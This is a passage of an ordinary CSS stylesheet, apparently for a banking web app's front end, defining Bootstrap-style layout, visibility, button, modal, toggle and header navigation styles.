                bottom: 10px;
                left: 50%;
                z-index: 15;
                width: 60%;
                margin-left: -30%;
                padding-left: 0;
                list-style: none;
                text-align: center;
            }
            .carousel-indicators li {
                display: inline-block;
                width: 10px;
                height: 10px;
                margin: 1px;
                text-indent: -999px;
                border: 1px solid #fff;
                border-radius: 10px;
                cursor: pointer;
                background-color: #000 \9;
                background-color: rgba(0, 0, 0, 0);
            }
            .carousel-indicators .active {
                margin: 0;
                width: 12px;
                height: 12px;
                background-color: #fff;
            }
            .carousel-caption {
                position: absolute;
                left: 15%;
                right: 15%;
                bottom: 20px;
                z-index: 10;
                padding-top: 20px;
                padding-bottom: 20px;
                color: #fff;
                text-align: center;
                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
            }
            .carousel-caption .btn {
                text-shadow: none;
            }
            @media screen and (min-width: 768px) {
                .carousel-control .glyphicon-chevron-left,
                .carousel-control .glyphicon-chevron-right,
                .carousel-control .icon-prev,
                .carousel-control .icon-next {
                    width: 30px;
                    height: 30px;
                    margin-top: -10px;
                    font-size: 30px;
                }
                .carousel-control .glyphicon-chevron-left,
                .carousel-control .icon-prev {
                    margin-left: -10px;
                }
                .carousel-control .glyphicon-chevron-right,
                .carousel-control .icon-next {
                    margin-right: -10px;
                }
                .carousel-caption {
                    left: 20%;
                    right: 20%;
                    padding-bottom: 30px;
                }
                .carousel-indicators {
                    bottom: 20px;
                }
            }
            .clearfix:before,
            .clearfix:after {
                content: " ";
                display: table;
            }
            .clearfix:after {
                clear: both;
            }
            .center-block {
                display: block;
                margin-left: auto;
                margin-right: auto;
            }
            .pull-right {
                float: right !important;
            }
            .pull-left {
                float: left !important;
            }
            .hide {
                display: none !important;
            }
            .show {
                display: block !important;
            }
            .invisible {
                visibility: hidden;
            }
            .text-hide {
                font: 0/0 a;
                color: transparent;
                text-shadow: none;
                background-color: transparent;
                border: 0;
            }
            .hidden {
                display: none !important;
            }
            .affix {
                position: fixed;
            }
            @-ms-viewport {
                width: device-width;
            }
            .visible-xs {
                display: none !important;
            }
            .visible-sm {
                display: none !important;
            }
            .visible-md {
                display: none !important;
            }
            .visible-lg {
                display: none !important;
            }
            .visible-xs-block,
            .visible-xs-inline,
            .visible-xs-inline-block,
            .visible-sm-block,
            .visible-sm-inline,
            .visible-sm-inline-block,
            .visible-md-block,
            .visible-md-inline,
            .visible-md-inline-block,
            .visible-lg-block,
            .visible-lg-inline,
            .visible-lg-inline-block {
                display: none !important;
            }
            @media (max-width: 767px) {
                .visible-xs {
                    display: block !important;
                }
                table.visible-xs {
                    display: table !important;
                }
                tr.visible-xs {
                    display: table-row !important;
                }
                th.visible-xs,
                td.visible-xs {
                    display: table-cell !important;
                }
            }
            @media (max-width: 767px) {
                .visible-xs-block {
                    display: block !important;
                }
            }
            @media (max-width: 767px) {
                .visible-xs-inline {
                    display: inline !important;
                }
            }
            @media (max-width: 767px) {
                .visible-xs-inline-block {
                    display: inline-block !important;
                }
            }
            @media (min-width: 768px) and (max-width: 991px) {
                .visible-sm {
                    display: block !important;
                }
                table.visible-sm {
                    display: table !important;
                }
                tr.visible-sm {
                    display: table-row !important;
                }
                th.visible-sm,
                td.visible-sm {
                    display: table-cell !important;
                }
            }
            @media (min-width: 768px) and (max-width: 991px) {
                .visible-sm-block {
                    display: block !important;
                }
            }
            @media (min-width: 768px) and (max-width: 991px) {
                .visible-sm-inline {
                    display: inline !important;
                }
            }
            @media (min-width: 768px) and (max-width: 991px) {
                .visible-sm-inline-block {
                    display: inline-block !important;
                }
            }
            @media (min-width: 992px) and (max-width: 1199px) {
                .visible-md {
                    display: block !important;
                }
                table.visible-md {
                    display: table !important;
                }
                tr.visible-md {
                    display: table-row !important;
                }
                th.visible-md,
                td.visible-md {
                    display: table-cell !important;
                }
            }
            @media (min-width: 992px) and (max-width: 1199px) {
                .visible-md-block {
                    display: block !important;
                }
            }
            @media (min-width: 992px) and (max-width: 1199px) {
                .visible-md-inline {
                    display: inline !important;
                }
            }
            @media (min-width: 992px) and (max-width: 1199px) {
                .visible-md-inline-block {
                    display: inline-block !important;
                }
            }
            @media (min-width: 1200px) {
                .visible-lg {
                    display: block !important;
                }
                table.visible-lg {
                    display: table !important;
                }
                tr.visible-lg {
                    display: table-row !important;
                }
                th.visible-lg,
                td.visible-lg {
                    display: table-cell !important;
                }
            }
            @media (min-width: 1200px) {
                .visible-lg-block {
                    display: block !important;
                }
            }
            @media (min-width: 1200px) {
                .visible-lg-inline {
                    display: inline !important;
                }
            }
            @media (min-width: 1200px) {
                .visible-lg-inline-block {
                    display: inline-block !important;
                }
            }
            @media (max-width: 767px) {
                .hidden-xs {
                    display: none !important;
                }
            }
            @media (min-width: 768px) and (max-width: 991px) {
                .hidden-sm {
                    display: none !important;
                }
            }
            @media (min-width: 992px) and (max-width: 1199px) {
                .hidden-md {
                    display: none !important;
                }
            }
            @media (min-width: 1200px) {
                .hidden-lg {
                    display: none !important;
                }
            }
            .visible-print {
                display: none !important;
            }
            @media print {
                .visible-print {
                    display: block !important;
                }
                table.visible-print {
                    display: table !important;
                }
                tr.visible-print {
                    display: table-row !important;
                }
                th.visible-print,
                td.visible-print {
                    display: table-cell !important;
                }
            }
            .visible-print-block {
                display: none !important;
            }
            @media print {
                .visible-print-block {
                    display: block !important;
                }
            }
            .visible-print-inline {
                display: none !important;
            }
            @media print {
                .visible-print-inline {
                    display: inline !important;
                }
            }
            .visible-print-inline-block {
                display: none !important;
            }
            @media print {
                .visible-print-inline-block {
                    display: inline-block !important;
                }
            }
            @media print {
                .hidden-print {
                    display: none !important;
                }
            }
            @keyframes rotate360 {
                from {
                    -ms-transform: rotate(0deg);
                    -webkit-transform: rotate(0deg);
                    transform: rotate(0deg);
                }
                to {
                    -ms-transform: rotate(360deg);
                    -webkit-transform: rotate(360deg);
                    transform: rotate(360deg);
                }
            }
            @-webkit-keyframes rotate360 {
                from {
                    -ms-transform: rotate(0deg);
                    -webkit-transform: rotate(0deg);
                    transform: rotate(0deg);
                }
                to {
                    -ms-transform: rotate(360deg);
                    -webkit-transform: rotate(360deg);
                    transform: rotate(360deg);
                }
            }
            .left {
                float: left;
            }
            .right {
                float: right;
            }
            .center {
                margin-left: auto !important;
                margin-right: auto !important;
            }
            .clear-margin {
                margin: 0 !important;
            }
            .clear-top-padding {
                padding-top: 0 !important;
            }
            .clear-right-padding {
                padding-right: 0 !important;
            }
            .clear-bottom-padding {
                padding-bottom: 0 !important;
            }
            .clear-left-padding {
                padding-left: 0 !important;
            }
            @media (max-width: 480px) {
                .clear-padding-xs {
                    padding: 0 !important;
                }
            }
            .clear-top-margin {
                margin-top: 0 !important;
            }
            .clear-right-margin {
                margin-right: 0 !important;
            }
            .clear-bottom-margin {
                margin-bottom: 0 !important;
            }
            .clear-left-margin {
                margin-left: 0 !important;
            }
            .clear-border {
                border: none !important;
            }
            .clear-box-shadow {
                box-shadow: none !important;
            }
            .uppercase {
                text-transform: uppercase;
            }
            .capitalize {
                text-transform: capitalize;
            }
            @media (max-width: 767px) {
                body {
                    padding-left: 0;
                    padding-right: 0;
                }
            }
            * {
                -webkit-border-radius: 0;
                -moz-border-radius: 0;
                -ms-border-radius: 0;
                -o-border-radius: 0;
                border-radius: 0;
                box-sizing: border-box;
                -moz-box-sizing: border-box;
                -webkit-box-sizing: border-box;
            }
            *::selection {
                background: rgba(255, 232, 64, 0.4);
                color: #000;
            }
            html {
                height: 100%;
            }
            body {
                font-family: "Source Sans Pro", sans-serif;
                font-size: 16px;
                letter-spacing: 0.2px;
                line-height: 1.6;
                color: #666;
                background: #fff;
                overflow-y: scroll;
                height: 100%;
                font-weight: 300;
            }
            textarea,
            select {
                font-family: "Source Sans Pro", sans-serif !important;
                -webkit-box-shadow: none !important;
                box-shadow: none !important;
                font-size: 16px !important;
                font-weight: 300 !important;
            }
            input[type="text"],
            input[type="password"],
            input[type="datetime"],
            input[type="datetime-local"],
            input[type="date"],
            input[type="month"],
            input[type="time"],
            input[type="week"],
            input[type="number"],
            input[type="email"],
            input[type="url"],
            input[type="search"],
            input[type="tel"],
            input[type="color"],
            .uneditable-input {
                -webkit-appearance: none;
                font-family: "Source Sans Pro", sans-serif;
                -webkit-box-shadow: none !important;
                box-shadow: none !important;
                font-size: 16px;
                font-weight: 300;
                outline: none;
                margin-bottom: 5px;
            }
            h1,
            h2,
            h3 {
                font-weight: 100;
                font-family: "Source Sans Pro Light", sans-serif;
                color: #000;
                line-height: 1;
            }
            h1 {
                font-size: 54px;
                margin-bottom: 25px;
            }
            h2 {
                font-size: 36px;
                margin-bottom: 20px;
            }
            h3 {
                font-size: 24px;
            }
            @media (max-width: 768px) {
                h1 {
                    font-size: 42px;
                }
                h2 {
                    font-size: 32px;
                }
            }
            label {
                font-weight: 300;
                color: #666666;
                text-transform: uppercase;
                font-size: 13px;
            }
            ol li,
            ul li {
                padding: 10px;
            }
            .alert {
                -webkit-box-shadow: none;
                box-shadow: none;
                padding: 8px 28px 8px 18px;
                margin: 9px;
                font-size: 13px;
                border-radius: 3px;
            }
            .alert-danger {
                background-color: #fef1f1;
                border: 1px solid #e2a8a8;
                color: #d46d6d;
            }
            .close {
                font-weight: 300;
            }
            .form-control {
                border-color: #dedede;
                border-width: 1px;
            }
            .form-control:active {
                border-color: #666666;
            }
            small {
                font-size: 13px;
            }
            p.small {
                font-size: 13px;
                line-height: 1.5;
            }
            .modal .modal-header .close {
                padding: 0 5px;
                margin-right: 0;
                margin-top: 0;
                font-size: 35px;
                line-height: 35px;
            }
            @media (max-width: 767px) {
                .text-xs-left {
                    text-align: left;
                }
                .text-xs-right {
                    text-align: right;
                }
                .text-xs-center {
                    text-align: center;
                }
                .text-xs-justify {
                    text-align: justify;
                }
            }
            @media (min-width: 768px) {
                .text-sm-left {
                    text-align: left;
                }
                .text-sm-right {
                    text-align: right;
                }
                .text-sm-center {
                    text-align: center;
                }
                .text-sm-justify {
                    text-align: justify;
                }
            }
            @media (min-width: 992px) {
                .text-md-left {
                    text-align: left;
                }
                .text-md-right {
                    text-align: right;
                }
                .text-md-center {
                    text-align: center;
                }
                .text-md-justify {
                    text-align: justify;
                }
            }
            @media (min-width: 1200px) {
                .text-lg-left {
                    text-align: left;
                }
                .text-lg-right {
                    text-align: right;
                }
                .text-lg-center {
                    text-align: center;
                }
                .text-lg-justify {
                    text-align: justify;
                }
            }
            .iconify {
                font-family: "chime", sans-serif;
                font-size: 36px;
                font-style: normal;
                font-weight: normal;
                vertical-align: middle;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
            }
            h1 .iconify,
            h2 .iconify,
            h3 .iconify {
                line-height: 80px;
            }
            .loading-spinner,
            .transactions-page .loading-txns-indicator:before,
            #ajax-loading-screen:before,
            .modal .modal-body .modal-loading-screen:before {
                content: " ";
                display: inline-block;
                -webkit-border-radius: 50px;
                -moz-border-radius: 50px;
                -ms-border-radius: 50px;
                -o-border-radius: 50px;
                border-radius: 50px;
                -webkit-animation: rotate360 1s linear infinite;
                -o-animation: rotate360 1s linear infinite;
                animation: rotate360 1s linear infinite;
                border: 4px solid rgba(102, 102, 102, 0.5);
                border-left-color: #1ec677;
                border-top-color: #1ec677;
                text-align: center;
                vertical-align: middle;
                position: absolute;
                width: 36px;
                height: 36px;
                margin-left: auto;
                margin-right: auto;
                top: 49%;
                left: 0;
                right: 0;
            }
            .btn {
                font-family: "Source Sans Pro", sans-serif;
                text-shadow: none;
                padding-top: 8px;
                padding-bottom: 8px;
                font-size: 16px;
                font-weight: 400;
                -webkit-box-shadow: none;
                box-shadow: none;
                -webkit-transition: all 0.3s ease 0s;
                -o-transition: all 0.3s ease 0s;
                transition: all 0.3s ease 0s;
                min-width: 80px;
            }
            .btn.btn-xs,
            .btn-group-xs > .btn {
                padding-top: 1px;
                padding-bottom: 1px;
                font-size: 12px;
            }
            .btn.btn-sm,
            .btn-group-sm > .btn {
                padding-top: 5px;
                padding-bottom: 5px;
                font-size: 12px;
            }
            .btn.btn-lg,
            .btn-group-lg > .btn {
                padding-top: 10px;
                padding-bottom: 10px;
                font-size: 18px;
            }
            .btn-success {
                background: #1ec677;
                border: 1px solid #1ec677;
            }
            .btn-success .iconify {
                font-size: 36px;
                line-height: 40px;
            }
            .btn-success:hover,
            .btn-success:focus,
            .btn-success:active {
                background: #1ec677;
                border-color: #1ec677;
            }
            .btn-success[disabled="disabled"],
            .btn-success.disabled {
                background: rgba(30, 198, 119, 0.3);
                border-color: rgba(30, 198, 119, 0.3);
                color: rgba(30, 198, 119, 0.7);
            }
            .btn-outline,
            .btn-outline-danger,
            .btn-outline-warning,
            .btn-outline-success,
            .btn-default,
            .btn-outline-primary {
                background: #fff;
                font-family: "Source Sans Pro", sans-serif;
                border: 1px solid #333333;
            }
            .btn-outline .iconify,
            .btn-outline-danger .iconify,
            .btn-outline-warning .iconify,
            .btn-outline-success .iconify,
            .btn-default .iconify,
            .btn-outline-primary .iconify {
                font-size: 30px;
                margin: 0 8px 0 15px;
            }
            .btn-outline-primary {
                border-color: #87dbea;
                color: #87dbea;
            }
            .btn-outline-primary:hover {
                background: #87dbea;
                color: #fff;
            }
            .btn-outline-primary:active {
                background: #0a45a4;
                color: #fff;
            }
            .half-vspacer {
                height: 15px;
            }
            .vertical-spacer1 {
                height: 25px;
            }
            .vertical-spacer2 {
                height: 45px;
            }
            .vertical-spacer3 {
                height: 55px;
            }
            .vertical-spacer4 {
                height: 65px;
            }
            .fine-print {
                color: #666666;
            }
            .modal h1,
            .modal h2,
            .modal h3,
            .modal h4 {
                margin-top: 0;
            }
            .modal .modal-body {
                font-size: 14px;
                padding: 10px 20px;
            }
            .modal .modal-body .modal-loading-screen {
                background: #fff;
                height: 100%;
                margin-left: -15px;
                margin-top: -15px;
                overflow: hidden;
                position: absolute;
                width: 100%;
                z-index: 2000;
            }
            .modal .modal-body .alert {
                font-size: 14px;
                margin-bottom: 8px !important;
            }
            .modal form {
                margin-bottom: 0;
            }
            .modal-backdrop,
            .modal-backdrop.fade.in {
                opacity: 0.35;
            }
            .secondary-menu button,
            .secondary-menu a {
                outline: none !important;
                font-size: 14px;
                padding: 5px 10px;
                min-width: 130px;
            }
            .secondary-menu button:first-child,
            .secondary-menu a:first-child {
                border-bottom-left-radius: 5px;
                border-top-left-radius: 5px;
            }
            .secondary-menu button:last-child,
            .secondary-menu a:last-child {
                border-bottom-right-radius: 5px;
                border-top-right-radius: 5px;
            }
            .secondary-menu button.active,
            .secondary-menu .btn-default.active {
                background: white !important;
                border-color: #1ec677 !important;
                color: #1ec677;
            }
            .secondary-menu .btn-group:first-child button,
            .secondary-menu .btn-group:first-child a {
                border-bottom-left-radius: 5px;
                border-top-left-radius: 5px;
            }
            .secondary-menu .btn-group:last-child button,
            .secondary-menu .btn-group:last-child a {
                border-bottom-right-radius: 5px;
                border-top-right-radius: 5px;
            }
            @media (max-width: 480px) {
                .secondary-menu {
                    width: 100%;
                }
                .secondary-menu > * {
                    display: block;
                    width: 100%;
                    padding-bottom: 8px !important;
                    padding-top: 8px !important;
                }
                .secondary-menu > *:first-child {
                    border-bottom-left-radius: 0 !important;
                    border-top-left-radius: 0 !important;
                    border-top-right-radius: 5px !important;
                    border-top-left-radius: 5px !important;
                }
                .secondary-menu > *:last-child {
                    border-bottom-right-radius: 0 !important;
                    border-top-right-radius: 0 !important;
                    border-bottom-right-radius: 5px !important;
                    border-bottom-left-radius: 5px !important;
                }
                .secondary-menu .btn-group:first-child button,
                .secondary-menu .btn-group:first-child a {
                    border-bottom-left-radius: 0 !important;
                    border-top-left-radius: 0 !important;
                    border-top-right-radius: 5px !important;
                    border-top-left-radius: 5px !important;
                }
                .secondary-menu .btn-group:last-child button,
                .secondary-menu .btn-group:last-child a {
                    border-bottom-right-radius: 0 !important;
                    border-top-right-radius: 0 !important;
                    border-bottom-right-radius: 5px !important;
                    border-bottom-left-radius: 5px !important;
                }
                .secondary-menu > .btn-group {
                    display: block;
                    width: 100%;
                    padding-top: 0 !important;
                    padding-bottom: 0 !important;
                }
                .secondary-menu > .btn-group .btn {
                    width: inherit;
                    padding-bottom: 8px !important;
                    padding-top: 8px !important;
                }
                .secondary-menu > *:first-child {
                    margin-left: -1px !important;
                }
            }
            .secondary-menu .downarrow {
                margin: 0;
                font-size: 20px;
                line-height: 17px;
            }
            .secondary-menu .dropdown-menu {
                padding: 0;
            }
            .secondary-menu .dropdown-menu li {
                padding: 0;
            }
            .secondary-menu .dropdown-menu a {
                padding: 10px 15px;
                font-weight: 300;
            }
            .panel {
                -webkit-border-radius: 5px;
                -moz-border-radius: 5px;
                -ms-border-radius: 5px;
                -o-border-radius: 5px;
                border-radius: 5px;
                -webkit-box-shadow: 0 0 1px rgba(0, 0, 0, 0.05);
                box-shadow: 0 0 1px rgba(0, 0, 0, 0.05);
            }
            .panel .panel-heading {
                -webkit-border-radius: 5px;
                -moz-border-radius: 5px;
                -ms-border-radius: 5px;
                -o-border-radius: 5px;
                border-radius: 5px;
                background: #fff;
                padding: 13px 15px;
                border-color: #ebebeb;
            }
            .panel .panel-heading .panel-title {
                font-weight: 300;
            }
            .panel .panel-body {
                border-top: 1px solid #ebebeb !important;
                background: #fff;
                border-bottom-right-radius: 5px;
                border-bottom-left-radius: 5px;
            }
            .panel .panel-body p {
                font-weight: 300;
            }
            .switch .cmn-toggle {
                position: absolute;
                visibility: hidden;
            }
            .switch .cmn-toggle + label {
                display: block;
                position: relative;
                cursor: pointer;
                outline: none;
                user-select: none;
            }
            .switch input.cmn-toggle-round + label {
                padding: 2px;
                width: 60px;
                height: 30px;
                background-color: #ddd;
                -webkit-border-radius: 30px;
                -moz-border-radius: 30px;
                -ms-border-radius: 30px;
                -o-border-radius: 30px;
                border-radius: 30px;
            }
            .switch input.cmn-toggle-round + label.disabled {
                opacity: 0.4;
            }
            .switch input.cmn-toggle-round + label:before,
            .switch input.cmn-toggle-round + label:after {
                display: block;
                position: absolute;
                top: 1px;
                left: 1px;
                bottom: 1px;
                content: "";
            }
            .switch input.cmn-toggle-round + label:before {
                right: 1px;
                background-color: #ddd;
                -webkit-border-radius: 30px;
                -moz-border-radius: 30px;
                -ms-border-radius: 30px;
                -o-border-radius: 30px;
                border-radius: 30px;
                -webkit-transition: background 0.4s;
                -o-transition: background 0.4s;
                transition: background 0.4s;
            }
            .switch input.cmn-toggle-round + label:after {
                width: 28px;
                background-color: #fff;
                border-radius: 100%;
                -webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
                -webkit-transition: margin 0.4s;
                -o-transition: margin 0.4s;
                transition: margin 0.4s;
            }
            .switch input.cmn-toggle-round:checked + label:before {
                background-color: #1ec677;
            }
            .switch input.cmn-toggle-round:checked + label:after {
                margin-left: 30px;
            }
            .ratings-indicator {
                position: relative;
                display: block;
                float: none;
            }
            .ratings-indicator li {
                height: 18px;
                width: 18px;
                line-height: 15px;
                margin: 1px;
                text-align: center;
            }
            .ratings-indicator li .iconify {
                font-size: 16px;
                line-height: 16px;
            }
            .ratings-indicator .rating-active {
                z-index: 0;
                position: absolute;
                height: 20px;
                overflow: hidden;
            }
            .ratings-indicator .rating-active .star-wrapper {
                width: 100px;
            }
            .ratings-indicator .rating-active li {
                background: #ee916e;
            }
            .ratings-indicator .rating-active li .iconify {
                color: #fff;
            }
            .ratings-indicator .rating-placeholder {
                z-index: 0;
            }
            .ratings-indicator .rating-placeholder li {
                background: #c3c3c3;
            }
            .ratings-indicator .rating-placeholder li .iconify {
                color: #dddddd;
            }
            .form-horizontal .form-group {
                margin-bottom: 10px;
            }
            .form-horizontal .control-label {
                font-size: 14px;
                color: #333;
                padding-top: 8px;
            }
            .btn-group > .btn {
                -webkit-box-shadow: none;
                box-shadow: none;
                -webkit-border-radius: 0;
                -moz-border-radius: 0;
                -ms-border-radius: 0;
                -o-border-radius: 0;
                border-radius: 0;
            }
            .btn-circle {
                width: 30px;
                height: 30px;
                text-align: center;
                padding: 6px 0;
                font-size: 12px;
                line-height: 1.42;
                border-radius: 15px;
            }
            @media (max-width: 480px) {
                .btn-block-xs {
                    display: block;
                    width: 100%;
                }
            }
            .table {
                width: 100%;
            }
            .table th {
                border-top: 1px solid #dadada !important;
                border-bottom: 1px solid #dadada;
                background: #f1f1f1;
            }
            .table td {
                border-top: 1px solid #f1f1f1;
            }
            .table td:hover {
                background: rgba(0, 0, 0, 0.03);
            }
            .label-inline {
                display: inline-block;
            }
            .label {
                display: inline;
                padding: 5px 0.61em 5px;
                font-size: 10px;
                font-weight: 400;
                text-transform: uppercase;
                line-height: 1;
                text-align: center;
                white-space: nowrap;
                vertical-align: baseline;
                border-radius: 0.25em;
                text-shadow: none;
                background: #fff;
            }
            .label[href]:hover,
            .label[href]:focus {
                color: #fff;
                text-decoration: none;
                cursor: pointer;
            }
            .label:empty {
                display: none;
            }
            .label.label-default {
                color: #666666;
                border: 1px solid rgba(102, 102, 102, 0.4);
            }
            .label.label-primary {
                color: #87dbea;
                border: 1px solid #87dbea;
            }
            .label.label-success {
                color: #1ec677;
                border: 1px solid #1ec677;
            }
            .label.label-info {
                color: #0a45a4;
                border: 1px solid #0a45a4;
            }
            .label.label-warning {
                color: #ffe840;
                border: 1px solid #ffe840;
            }
            .label.label-danger {
                color: #ee916e;
                border: 1px solid #ee916e;
            }
            .text-success {
                color: #1ec677;
            }
            .text-danger {
                color: #dd5722;
            }
            .ls-1 {
                letter-spacing: 1px;
            }
            *::-moz-selection {
                background: rgba(255, 232, 64, 0.4);
                color: #000;
            }
            input::-moz-focus-inner {
                border: 0 !important;
            }
            input:-webkit-autofill {
                color: #fff !important;
            }
            object,
            embed,
            a,
            a:hover,
            a:active,
            a:focus,
            button::-moz-focus-inner,
            .btn:focus,
            .btn.focus,
            .btn:active:focus,
            .btn.focus:active,
            .btn.active:focus,
            .btn.active.focus {
                outline: 0 !important;
            }
            mark,
            .mark {
                color: #555;
                background: #fff;
                font-weight: 400;
            }
            input.faux_amount {
                font-size: 24px;
                font-weight: 300;
                text-align: right;
                height: 50px;
            }
            input[type="number"] {
                -moz-appearance: textfield;
            }
            input[type="number"]::-webkit-inner-spin-button,
            input[type="number"]::-webkit-outer-spin-button {
                -webkit-appearance: none;
                margin: 0;
            }
            a.clean {
                text-decoration: none;
            }
            .placeholder {
                color: #aaa !important;
            }
            .chime-text {
                color: #1ec677;
            }
            .monospace {
                font-family: monospace;
            }
            .micr {
                font-family: "micr", monospace;
            }
            .btn-default {
                border-color: #dedede !important;
                background: transparent !important;
                color: #666;
            }
            .btn-default:hover {
                background: rgba(102, 102, 102, 0.1) !important;
                color: #666;
            }
            .btn-default:active,
            .btn-default.active {
                background: #dedede !important;
                color: #333;
            }
            .btn-primary {
                background: #87dbea;
                border: 1px solid #87dbea;
            }
            .btn-primary:hover {
                background: #0a45a4;
                border-color: #0a45a4;
            }
            .btn-outline-success {
                border-color: #1ec677;
                color: #1ec677;
            }
            .btn-outline-success:hover {
                background: #1ec677;
                color: #fff;
            }
            .btn-outline-success:active {
                background: #1ec677;
                color: #fff;
            }
            .btn-outline-warning {
                border-color: #ffe840;
                color: #ffe840;
            }
            .btn-outline-warning:hover,
            .btn-outline-warning:active {
                background: #ffe840;
                color: #fff;
            }
            .btn-outline-danger {
                border-color: #ee916e;
                color: #ee916e;
            }
            .btn-outline-danger:hover {
                background: #ee916e;
                color: #fff;
            }
            .btn-outline-danger:active {
                background: #dd5722;
                color: #fff;
            }
            .btn-danger {
                background: #ee916e;
                border: 1px solid #ee916e;
            }
            .btn-danger:hover {
                background: #dd6e43;
                border-color: #dd6e43;
            }
            .btn-danger:active {
                background: #dd5722;
                border-color: #dd5722;
            }
            .rotate90 {
                display: inline-block;
                -webkit-transform: rotate(90deg);
                -ms-transform: rotate(90deg);
                -o-transform: rotate(90deg);
                transform: rotate(90deg);
            }
            .relative-wrap {
                position: relative;
            }
            .highlight {
                background: #f6f6f6;
                border: 1px solid #d9d9d9;
            }
            .title {
                border-bottom: 1px solid #efefef;
                margin-bottom: 20px;
            }
            .clip {
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            .inline-block {
                display: inline-block;
            }
            .alert-warning {
                background-color: #fffae4;
                border: 1px solid #f4cd33;
                color: #c39d02;
            }
            .alert-success {
                background-color: #e8f7ed;
                border: 1px solid #30b661;
                color: #1ba84e;
            }
            .progress-bar-success {
                background-color: #1ec677;
            }
            .list-upper-roman {
                list-style-type: upper-roman;
            }
            .list-lower-roman {
                list-style-type: lower-roman;
            }
            .list-upper-alpha {
                list-style-type: upper-alpha;
            }
            .list-lower-alpha {
                list-style-type: lower-alpha;
            }
            .list-circle {
                list-style-type: circle;
            }
            .list-decimal {
                list-style-type: decimal;
            }
            .panel-group {
                margin-bottom: 12px;
            }
            .list-group .list-group-item {
                border-width: 1px;
            }
            .list-group .list-group-item:last-child {
                border-bottom-width: 1px;
            }
            .dropdown-menu {
                padding: 0;
            }
            @media (min-width: 767px) {
                .dropdown-menu.multi-col {
                    width: 420px;
                }
            }
            #card-blocked-banner a {
                color: #a94442;
            }
            #card-blocked-banner a.underline {
                text-decoration: underline;
            }
            #privacy-policy {
                position: relative;
            }
            #privacy-policy h3 {
                margin: 10px 0;
            }
            .nano {
                width: 100%;
                height: 100%;
                position: relative;
                overflow: hidden;
            }
            .nano .nano-content {
                position: absolute;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                overflow: scroll;
                overflow-x: hidden;
            }
            .nano .nano-content:focus {
                outline: thin dotted;
            }
            .nano .nano-content::-webkit-scrollbar {
                display: none;
            }
            .nano > .nano-pane {
                width: 10px;
                background: rgba(0, 0, 0, 0.25);
                position: absolute;
                top: 0;
                right: 0;
                bottom: 0;
                -webkit-transition: 0.2s;
                -moz-transition: 0.2s;
                -o-transition: 0.2s;
                transition: 0.2s;
                -webkit-border-radius: 5px;
                -moz-border-radius: 5px;
                border-radius: 5px;
                visibility: hidden\9;
                opacity: 0.01;
            }
            .nano > .nano-pane > .nano-slider {
                background: #444;
                background: rgba(0, 0, 0, 0.5);
                position: relative;
                margin: 0 1px;
                -webkit-border-radius: 3px;
                -moz-border-radius: 3px;
                border-radius: 3px;
            }
            .has-scrollbar > .nano-content::-webkit-scrollbar {
                display: block;
            }
            .nano:hover > .nano-pane,
            .nano-pane.active,
            .nano-pane.flashed {
                visibility: visible\9;
                opacity: 0.99;
            }
            #header {
                margin-bottom: 0;
            }
            #header.simple {
                text-align: center;
            }
            #header .logo-wrapper {
                padding: 38px 0 0 0;
            }
            @media (max-width: 767px) {
                #header .logo-wrapper {
                    padding: 20px 0 0 0;
                }
            }
            #header.signed-out {
                background: #fff;
                border-left: 0;
                border-right: 0;
                border-top: 0;
                border-bottom: 0;
                z-index: 3;
            }
            #header.signed-out > .container-fluid .navbar-header {
                margin-bottom: 6px;
            }
            #header.signed-out > .container-fluid .navbar-header .navbar-toggle {
                margin-top: 18px;
                border: 2px #1ec677 solid;
                background: transparent;
            }
            #header.signed-out > .container-fluid .navbar-header .navbar-toggle:focus {
                outline: 0 none;
            }
            #header.signed-out > .container-fluid .navbar-header .navbar-toggle:focus,
            #header.signed-out > .container-fluid .navbar-header .navbar-toggle:hover {
                background: rgba(38, 221, 90, 0.3);
            }
            #header.signed-out > .container-fluid .navbar-header .navbar-toggle .icon-bar {
                background: #1ec677;
            }
            #header.signed-out > .container-fluid .navbar-nav > li > a {
                padding-top: 6px;
                padding-bottom: 6px;
                padding-left: 11px;
                padding-right: 11px;
            }
            #header.signed-out > .container-fluid .navbar-nav > li > a.btn.btn-success {
                color: #fff;
                width: 113px;
            }
            #header.signed-out > .container-fluid .navbar-nav > li > a.btn.btn-success:hover,
            #header.signed-out > .container-fluid .navbar-nav > li > a.btn.btn-success:active {
                background: #fff;
                border-color: #1ec677;
                color: #1ec677;
            }
            #header.signed-out > .container-fluid .navbar-collapse li {
                margin-top: 5px;
                margin-bottom: 5px;
                padding: 10px 3px 12px;
            }
            #header.signed-out > .container-fluid .navbar-collapse li > a {
                margin-bottom: 0;
                border: 2px solid transparent;
                -webkit-border-radius: 30px;
                -moz-border-radius: 30px;
                -ms-border-radius: 30px;
                -o-border-radius: 30px;
                border-radius: 30px;
                font-size: 13px;
                font-weight: 600;
                letter-spacing: 1.2px;
            }
            @media (max-width: 767px) {
                #header.signed-out > .container-fluid .navbar-collapse li > a {
                    font-size: 14px;
                    letter-spacing: 0.4px;
                    text-transform: none;
                }
            }
            #header.signed-out > .container-fluid .navbar-collapse li > a:hover {
                background: transparent;
                opacity: 0.65;
            }
            #header.signed-out > .container-fluid .navbar-collapse li.active > a,
            #header.signed-out > .container-fluid .navbar-collapse li > a.active {
                background: #fff;
                color: #1ec677;
            }
            @media (max-width: 768px) {
                #header.signed-out > .container-fluid .navbar-collapse li {
                    padding: 6px;
                }
            }
            #header.signed-out > .container-fluid .navbar-collapse .dropdown.open .sign-in-btn {
                text-decoration: none;
                border: 2px solid #fff;
            }
            #header.signed-out > .container-fluid .navbar-collapse .dropdown .sign-in-form-container {
                padding: 15px;
                min-width: 280px;
            }
            #header.signed-out > .container-fluid .navbar-collapse .dropdown .sign-in-form-container .reset-password {
                padding: 7px 0 0;
            }
            #header.signed-out > .container-fluid .navbar-collapse .dropdown li {
                margin: 0;
                padding: 4px 6px;
            }
            #header.signed-out > .container-fluid .navbar-collapse .dropdown li a {
                padding: 6px 9px;
            }
            @media (max-width: 768px) {
                #header.signed-out > .container-fluid .navbar-collapse .dropdown li {
                    padding: 6px;
                }
            }
            #header.signed-out > .container-fluid .navbar-collapse.in {
                background: #fff;
            }
            @media (max-width: 767px) {
